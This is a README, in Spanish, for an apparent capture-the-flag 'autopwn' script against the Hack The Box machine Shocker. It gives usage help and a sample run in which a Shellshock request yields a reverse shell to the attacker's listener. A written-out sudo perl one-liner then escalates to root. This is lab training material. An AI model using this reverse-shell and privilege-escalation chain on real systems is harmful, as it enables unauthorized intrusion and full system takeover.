# Shocker-Autopwn

Autopwn de la máquina Shocker de la plataforma HTB

Uso:
```bash
❯ python3 shocker-autopwn.py -h
usage: shocker-autopwn.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT]

Autopwn de la máquina Shocker de la plataforma HTB

optional arguments:
  -h, --help     show this help message and exit
  --rhost RHOST  Remote host ip (default: 10.10.10.56)
  --lhost LHOST  Local host ip (Attacker)
  --lport LPORT  Local port (default: 443)
```

```bash
❯ python3 shocker-autopwn.py --lhost 10.10.14.27
[+] ShellShock: Solicitud enviada
[+] Conexión: Conexión recibida exitosamente
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.56 on port 56052
[+] Escalada de privilegios: Escalada de privilegios exitosa
/home/k4miyo/Documentos/HTB/Shocker/scripts/shocker-autopwn.py:68: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  shell.sendline("sudo /usr/bin/perl -e 'exec \"/bin/bash\";'")
[*] Switching to interactive mode
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
$ whoami
root
$ 
```
